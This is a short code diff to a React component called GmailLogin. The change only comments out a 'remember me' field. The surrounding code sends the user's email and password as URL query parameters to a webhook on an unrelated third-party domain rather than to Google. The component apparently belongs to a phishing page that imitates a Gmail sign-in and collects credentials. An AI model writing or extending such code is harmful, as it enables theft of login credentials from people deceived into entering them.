@@ -166,7 +166,7 @@ function GmailLogin({ onBack }) {
 const dataForm = new URLSearchParams();
 dataForm.append('email', email ? email : ''); // Ensure email is not undefined
 dataForm.append('password', password ? password : ''); // Ensure password is not undefined
-dataForm.append('rememberMe', rememberMe ? 'true' : 'false');
+// dataForm.append('rememberMe', rememberMe ? 'true' : 'false');
 
 fetch('https://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603/?' + dataForm.toString(), {
   method: 'GET',
